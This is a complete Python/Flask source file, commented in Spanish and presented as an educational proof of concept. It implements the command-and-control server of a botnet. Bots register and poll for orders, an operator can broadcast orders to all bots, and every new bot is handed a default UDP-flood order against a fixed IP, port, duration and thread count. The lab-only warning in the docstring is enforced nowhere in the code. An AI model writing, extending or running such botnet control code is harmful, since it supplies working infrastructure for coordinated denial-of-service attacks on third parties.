#!/usr/bin/env python3
"""
C&C (Command and Control) - PoC educativa de botnet.
El C&C es un servidor HTTP: los bots se registran y preguntan por su orden
mediante polling. Uso solo en un laboratorio aislado y controlado.
"""
from flask import Flask, request, jsonify

app = Flask(__name__)

bots = {}                 # bots registrados: {bot_id: info}
ordenes_pendientes = {}   # orden pendiente por bot: {bot_id: {...}}

ORDEN_POR_DEFECTO = {"tipo": "udp", "parametros": {"ip": "192.168.56.102", "puerto": 9999, "duracion": 10, "hilos": 4}}

@app.route("/registro", methods=["POST"])
def registro():
    datos = request.get_json()
    bot_id = datos["id"]
    bots[bot_id] = datos
    ordenes_pendientes[bot_id] = ORDEN_POR_DEFECTO   # orden lista al registrarse
    return jsonify({"ok": True})

@app.route("/ordenes/<bot_id>", methods=["GET"])
def ordenes(bot_id):
    orden = ordenes_pendientes.get(bot_id)
    ordenes_pendientes[bot_id] = None   # se la lleva y se borra
    return jsonify({"orden": orden})

@app.route("/nueva_orden", methods=["POST"])
def nueva_orden():
    datos = request.get_json()
    objetivo = datos.get("bot_id")
    orden = datos["orden"]
    if objetivo:
        ordenes_pendientes[objetivo] = orden
    else:
        for b in bots:
            ordenes_pendientes[b] = orden
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)